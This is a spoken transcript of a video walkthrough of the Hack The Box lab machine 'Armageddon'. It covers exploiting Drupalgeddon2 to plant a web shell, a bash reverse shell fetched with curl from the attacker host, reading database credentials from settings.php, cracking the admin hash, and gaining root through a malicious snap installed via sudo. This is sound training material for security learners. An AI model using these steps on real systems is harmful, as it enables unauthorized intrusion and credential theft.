 what's going on youtube this is ipsec i'm doing armageddon from hack the box which is an easy linux box so i'm doing this live i haven't seen it before however i record these intros after i do the video so i know it starts off with finding a drupal instance we dig into finding the version of drupal looking at some public scripts and also the github repo and just finding out how to do it on our own and once we find out the version we know it is vulnerable to drupalgeddon which is just a unauthenticated rce against drupal we get a shell on the box find out that we can run sudo with snap install dig into it a little bit and using gtfo bins we can install a malicious nap which gives us a root gel and then at the very end of the video we'll dig into a little bit about snap and how it differs from apt or apt so with all that being said let's jump in as always we're going to start with the nmaps going to make the directory end map and then because i'm impatient i'm going to do a very quick nmap scan up front so dash p dash to do all ports one through six five thousand five hundred and thirty five and then dash dash min dash rate to set the minimum rate for ten thousand packets per second and then the ip address of ten ten ten to thirty three and we can say oh a and map armageddon all ports and let this go um i wouldn't recommend doing this often at least on engagements because this sends a lot of traffic and even if just doing it in ctfs you're saying enough traffic where you may miss ports so it's not something to rely on but you just want a quick view of the box maybe you're competing for bloods this is good because it sends it at 10 000 packets per second so you can see my nmap scan finished in 7.8 seconds if we wanted to speed that up we probably could have added a dash n flag because i'm assuming like at least one of those seconds is it's doing host discovery and doing dns so if i add the stash n flag we'll see what it's at maybe maybe that wasn't it 7.5 seconds but still pretty quick so now that we know there's only ssh in http we can take a poke at that but always like having recon go on the background so dash sc for default scripts sv enumerate versions oh a output all formats nmap armageddon 10 10 10 233 so now with that running we can go over to firefox and check out what the page was we have a just welcome to armageddon and oddly enough this is typoed they have arnageddon so maybe that's a terminator reference i don't know but this page to me either streams um joomla or drupal just based upon this user login feel looking at it i think this is drupal just looking at the urls if you didn't know you can go into the page source and we can see it says drupal 7. so at this point we can either run a automated scanner there's plenty of drupal scanners so if we do drupal scanner on github on google so google doc oh my god come on google.com there we go drupal scanner we can probably find a few there is droop and this and this was last built um june 7th 2021 so this is probably good uh the thing i don't like about this is it's designed like it's named against drupal but does multiple cmss so i don't know how i feel about that um if i just do drupal scanner github and look at other ones like drewpone cms thing my issue with a lot of these like one-off cms scanners is sometimes they don't stay up to date well this one's 2013 but that's something to always check inside of github so looks like a lot of these are actually up to date so we could just use them i'm probably going to try out droop scan i haven't ran that before but if you didn't have a tool maybe you're doing something that just didn't have a scan already what i would generally do is just go to like github i'll have to go to google first and then we can do github drupal and look at the source for this and kind of get an idea how to fingerprint this cms so we can see install.txt may exist so i'm just going to try going to install.text and we can see this and scrolling around we have instructions but no way to identify the version so looking at the other things dot text um robots.txt and that nothing too interesting there this is on 9.2 and if we looked at the um source it was on drupal 7. so i can go over to github and change that to version 7. and we can see changelog.txt copyright.txt install mysql so changelog.txt is always a good one and we can look at it and it looks like it is running drupal 7.56 i bet if we go and run this tool it'll also show that i'm going to do app search oh and um nmap tells us it's drupal 7 as well apt two different typos different ways app search droop scad does not have it so i'm going to go to cd opt and let's go install this tool so get clone and go into droop scan how do they install it it's a python thing oh do i just have it uh no module name cement i'm going to create a virtual environment so python 3 vm vm and i just do this so when i install this i don't muck with my system libraries so source vm bin activate it's a bit of a pain to use tools when you always use virtual environments but it's also a pain when you hose your environment because you didn't use this you have to reinstall the os so um pick your poison i guess uh let's see that did not work is there a requirements.txt there is pyth uh let's do pip 3 install requirements whoops dot text and we'll install this and nine times out of ten once you install requirements.txt the application will work so there we go we have droop scan and we just do troop scan scan drupal dash u i don't know if i specify http or not let's just do u 233 and it looks like it is running i don't know if this version is hardcoded but maybe we got lucky it's at 1.33.7 something tells me that is certainly hard coded uh does this have versions i don't even know where versions are but it takes some time to scan i guess we can just look at the exact version and look for exploits so drupal 756 let's do search point on our box and let's see we have 758 drupal get in three it's authenticated so we may want to do like some type of password spray or things like that but we do have drupal getting two not saying it is authenticated so let's google or not google grip drupal get into did i type that wrong let's just copy and paste maybe i did we can do search split on drupal get into just to pull these uh we have ruby ruby python i like python scripts more so that's the one i'm going to start with search point dash m and oddly enough um the ruby one this one says it's 758 but this is saying less than eight so hopefully this script works if this doesn't i'm going to switch over to this ruby one because it at least says it supports seven uh drupal version seven so python three a lot of fours there url 10 10 10 233 this is actually specifying http so we'll do that uh it's trying to register let's see the host is saying 233 user so what i want to probably do 10 10 10 233 slash and it's saying it is not exploitable we do have the scan finished and drip scan says the possible version 756 and nothing else uh no real plugins themes etc so i'm going to take a look at the ruby one where we could always do metasploit and sports generally the best bet there's a lot of people that don't like using metasploit i'm always a fan of using it let's see how this works it looks like it is just ruby it's dropping some type of web shell shell.php so if i was on an engagement i may rename this variable because if someone else is poking the box so i forget to clean up that's a very bad thing to leave behind so let's see what if i just do ruby if i can execute anything do they have how to use it got milk man i thought there'd be like a help let's see function so drupal version 7 needs an extra value from a form so this is probably why the python one didn't work let's just go to google and see if there's an exploit for it so if there isn't then i'm just going to switch to metasploit drupalgenium2poc7 python i'm going to revert that google change i did let's see pending yet to be coded 758 so it looks like maybe this is not there that's the downside to doing these videos live typically i would um be able to prep and make sure i know everything to do so drupal get into target i think this is the ruby script i have so http 101010 233 uh we probably have to do some type of gems load like the pip equivalent of ruby let's see cd up get clone see require rubygems cannot load such file highline maybe gem install highline pseudogem install highline see if this works oops there we go that looks much better uh i just saw cannot load file highline and that's why i thought of that see we're sending payload looks like we have a hit so it did it to show.php and if i do this maybe it's going to give me hostname oh i'm in a shell here so if i do who am i apache so the thing i probably want to do is just get a standard reverse shell so nclvnp 9001 you can do bash dash c bash dash i dev tcp 10 10 14 8 9 000 1. see if this sends it uh bad character let's see reverse shell cheat sheet pen test monkey and we'll use this nc one and if this doesn't work we'll probably either give up and use the shell that the script provides or we will just use curl and do it without bad payloads so 10 10 14 8 9001. looks fine detected bad characters make third www v index.html and we'll just do c bash dash i uh what was it like that dev tcp 1010 14 8 0 and one then python three dash m http server girl 1010 14 8 index dot html bash and we have to listen girl 10 10 14 8. permission denied what i am 10 10 14 8. i wonder if um like there's some type of firewall preventing me see python 3 port 80. let's just try on port 80 girl 10 10 14 8. that worked 8 000 okay so let's do index.html 1010 14.8 instead of 9001 let's do port 443 and what did we name this file i thought i named it index.html oh not in dub dub dub there and we have to listen on 443 and the reason why i switched to 443 than 9001 is because port 8000 did not work so so i switched to 443 because i assumed if 8000 didn't work 9001 wouldn't work so now i have a standard reverse shell um i'm going to do the tty trick so python3 dash c import pty pty spawn then bash uh out of weird did all this work to get some type of reverse shell and it looks like it was for nothing i don't know if i've seen that os error out of pty devices we can certainly google this and see what this is let's see on ubuntu value is configurable in this they do something to kill this i just did that again because i timed out on this one so i want to make sure my shell was still working um let's see grab v and then grab this and what this is doing is counting the file and um removing anything that begins with a comment it doesn't look like i have anything special okay i'm not exactly sure why i can't do that um do i have python 3 i assume i do yep our pty devices um script dash queue let's do script h so script dash quiet uh dash command maybe now let's do script that's quiet and devnl okay um bty failed again so not sure i guess the last thing we can do is see if we can ssh in so i'm gonna do who am i look at apache and i can grab apache on etsy past wd and we can see apache has no login so if i even ssh in i can't really execute anything because i don't have a shell so at this point um i know i compromised a web server so web servers generally have lots of credentials you have the mysql credential things in the database like web servers are known for credentials so that's probably where i look at first before i do any type of enumeration script because just running like lin p's or something can get you caught um poking at things individually probably won't so that's why i want to go harvest the credentials see what they are before i do anything i'm going to cat etsy pass wd look at everything here knowingly i can't use that up so etsy pass wd and i'm gonna grep for anything that ends in sh and there's only two accounts root and bruce the real admin so i'm gonna go to var dub dub dub which i guess is my home directory html and we will look for something that has config this show.php is obviously me but um find dot grep conf we have misconfigure web config and editor config i think web.config sounds the best so we cut this file and we have quite a bit of information so let's see search this for password and no uh let's see grab dash ri this is probably gonna be bad yeah that's themes so you gotta find out where the drupal config is it doesn't look like it's in web.config um find uh grap conf uh that's a png so the config is probably gonna be some type of dot php the easiest way is probably just to look at index.php and i don't have a proper shell so i can't see everything maybe grep include on index.php and it's including bootstrap.inc it doesn't look promising cat includes bootstrap bootstrap.inc maybe it is let's see cd includes cat bootstrap dot inc grep dash i pass we got passed through again i was looking for a password uh we're in this includes directory so our i password uh password.inc update.inc let's see grab ri mysql is set database so i am at a loss what i'm going to do is go to google and we'll say drupal change my sequel password see sites default settings.php so sites default cat settings.php and we should have a password in here that's proxy so we got database right here drupal user and man that is a complex password the creds mysql drupal user paste that password okay can i do su bruce the real admin paste that password uh system error not saying bad password if i do seo on my machine it'll probably say bad password there not system error so that's always reading error messages and figure out what's going on so that password could have been good so i'm going to try sh bruce the real admin at 10 10 10 233 except this fingerprint paste and nothing so let's do mysql dash u drupal user dash p put that password in let's see unknown database so mysql dash u drupal user i think it's capital p if you want to put a password in as an argument i'm just going to do it like this and do we get n show databases so it looks like i authenticated but because i don't have this like actual pty something went bad so let's see let's do this exploit again 4449 hdp 10 10 10 233 see it's already got that can we do it from here my sql dash u drupal user dash p dash capital p and put it here let's see my sql specify password cmd line really got to fix that about my browser on this machine so dash dash password equals i think i saw yep so dash dash password equals this and since this is a web shell and it's not got a proper tty chances are um i just can't like get any output or keep running commands so i'm going to keep using this mysql command and we can say like show databases and maybe this is going to work maybe it won't unknown database see that doesn't work uh we could go back to that config the database name is probably going to be drupal show tables unknown database let's see so we want to get back into this so we can do uh let's see if i just search for settings.com looks like it's out of my pane so cat verb dub dub dub html sites let's do ls uh default settings.php we can i guess search for maybe drupal where is that password here we go database drupal they have a capital d or something unknown database okay um let's see my sequel command line specify query and there's probably a much better way to go about doing this on a single mysql query i think it wants me to do oh dash e maybe there we go so i'm going to just try e and we can say show databases and that works as well so we can see drupal right there so show tables and let's look for user we've got users so the next command i'm going to do is describe to show me all the columns in this so describe users we have uid name pass mail so and login so select uid name pass login from users and we got bruce the real admin and a sql hash or um i said sql because it starts with s but that's probably like a php hash so i'm going to go over to this pane we can do hash cat example hashes less and look for dollar s dollar and it looks like it's specific to drupal and it's mode 7 900. so v hashes paste that ios user share word list do i have rocky.txt there i do let's just try hash cat real quick 7900 the word list of um user wait it's hash then we're list user share word list rocky.text should be good uh unknown cpu generic probably doesn't like running off of my vm so let's get hashcat somewhere else so we can crack this or we can probably do john the ripper so if i just do john hashes dash dash word list as equal and we got the password cracked as boo boo so we could go inside of drupal now log in as this and probably upload a web show like we would wordpress or we could try ssh uh as bruce the real admin at 10 10 10 2 33. boo boo and we get logged in awesome so now we have a show on the box as bruce and if i do sudo l we can do user bin snap install so i always go to gtfo bins let's go to google gtfo bins and then type snap and i think at the time of launch um we couldn't just do this because i don't think snap was on gtfo bins so but it is now i'm gonna change the command to bash it was id so it'd only say hey you a root so if i cat test we got this copy and let's paste fpm command not found do i have fpm here apt install fpm sudo apt install fpm sudo do i have snap install fpm let's see let's see what happens when this goes i may screw up my whole distro probably should have down a snapshot before i ran that command but i like to live dangerously sometimes so we don't have fpm what is fpm help if i went here call fpm quick build okay install installation guide brew dnf yum gems so now let's go back uh cat test so i should be able to generate the package so if you don't know what snap is snap is like a um like app yum etc just different package manager so we just generated a malicious package so we can do python 3-m http server we have to specify port 80 i think so let's do w get 10 10 14 8 and then the file name this curl dash o test.snap sudo snap install test.snap and then there were some options that wanted dash dash dangerous and dash dash dev mode so it's running so it looks like it executed bash but doesn't give us a prompt back and that's annoying but we can work with that so i'm going to do which bash we see use it's at user bin bash and let's see okay now i'm gonna go back into cd home v test v test and let's do a ch chmod 4755 user bin bash cat test let's create this pac v test annoyingly it changed my directory okay create a package uh ls temp it's somewhere here i don't know which one it is so we can do dash la see 101 there's the same time frames cut test i think if i just execute it it'll put me in the directory okay python3 dash m http server 80 sudo and let's do another curl on test2.snap run this and let's see if it worked so if all went well um this should be a set uid binary i don't like that it's taking a while to run user bin bash and the permissions are still the same so nothing happened there install snap change in progress so let's do a pspf grip for snap so it looks like we have a few things running i don't know if that screwed things up or not i guess we can just wait a little bit and see if this eventually gets set uid bit so it's been a while and there's nothing so what i'm going to try doing is let's exit here edit test and instead of doing something malicious my general first step is always do something not malicious i can just touch temp owned and if we see this file is created by root then we know something good happened so let's cat test we can paste this and we create the package that test.snap let's do strings on the snap and we can see bin sh it's executing temp owned so that looks good let's do a python and we can go back to ssh the curl and we'll call this pleasework.snap sudo snap install let's call it please work and sung in a different spot the setting automatic alias for snap what i'm going to do instead of sh again i'm going to do bruce the real admin at 10 10 10 233 and we can type the password of booboo lstemp and inside attempt there is no owned so let's see cannot perform run install hook exit status one so i don't see that file owned existing so don't think that worked which is unique i'm going to try one last thing and that is just creating this package and hosting it curl call it default install i'm just curious if it's going to say root at the end like exactly what was this trying to do is it going to error or not so i'm going to pause the video and let this run and the id command worked because we have the output right here so it says run hook if present this so i'm going to do which id it's in user bin if i do which chmod it's in user bin so i don't think this is like a path issue why the ch mod didn't work um i'm going to try maybe it's i can't have spaces in command command equals exact test echo command that looks fine the test so i'm going to [Music] just try to cat root root our text so let's see if we get the actual flag this way so cat test copy python we can go over here curl and we'll call it flag.snap and then sudo snap install flag.snap oh we have to do dangerous in developers and i guess the other thing i can do is not control z this and just let this hook finish it just seems to take a while which maybe that was my mistake and i killed it before this command finished but i don't think i did that with the touching a file but i'm going to pause the video we'll see if this install hook airs and prints out the flag so it looks like it did so i think that was my mistake is just being impatient so let's go back here v test and let's just do chmod four seven five five user ben bash and then let's make the snap again so go here whoops wrong copy web server ssh curl call it huzzah because that's how we're going to feel when this works zero snap install azad.snap and i'm going to let this time out and we're going to see if this does it so lsla use a bin bash by strings this user bin bash so everything looks fine and we just have to wait for this to error out which probably happened within the next 10 to 15 seconds so i really don't know what to say except sorry for wasting your time on this exploit because i was impatient but yeah cool chmod cannot access user bin bash no directory that is actually bizarre i wonder if it like has a ch root for user bin and that's why it can't do things because i did a cat on slash root slash flag dot or root dot text and it worked but when i specify something in this directory it does not work um cp user bin bash let's see we can probably just copy it to our home directory so let's try this uh home bruce the real admin so maybe i didn't waste your time there's a little bit more to this exploit i guess or not exploit but this thing so let's i'm going to erase that whole thing we can call this home bruce the real admin bash and we probably have to ch own it so ch own root root home bruce the real admin bash so i probably should do this in two different snap packages one to ch own one to do the ch mod but oh well so let's cat test and run this python curl omg.snap run this and let's wait for 30 seconds for it to finish actually it's taking a while to mount snap that's different oh already root root so bash p and my effective uid is zero so if i go to cd slash root i can cat root.text apologies for the abrupt cut but i have some extra time before i publish this video so i wanted to dig into snap a little bit more to find out exactly what was happening i did some light googling and just did like snap vs apt to see what the differences between these packages are and scrolling down i think this page has a list it does it says dependencies are contained in the package so my understanding of snap is it's kind of like a python virtual environment where the package includes everything you need to run the binary and then if we take a look at the man page to kind of see what we're doing we passed two flags the first one was dangerous and this says it installs a given snap even if there's no pre-acknowledged signature for it meaning we can just upload unauthorized snaps typically all the snaps go to our store which gets some type of verifications probably not great just like your app store on a phone but yeah so that's why we can install a random snap the other thing we did was enable dev mode if we look at dev mode we have put the snap in development mode and disable security confinement so what this is essentially doing is allowing us to access system resources if we don't understand this we can probably just google like if we go back and say snap what is dev mode let's see demystifying snap confinement so i think this will say eventually it enables us to access system resources so my guess at exactly what was happening is we couldn't edit user bin bash because it packages a bunch of directories and user bin is one of the virtual environments snap packages however temp is not so that's why when we copied bash over to temp it just magically worked so i would definitely take a look at this post to understand what security and confinement is but that is a tldr on snap and what was going on hopefully it helps um it could be wrong because again not an expert but that would be the video take care and i'll see you all next time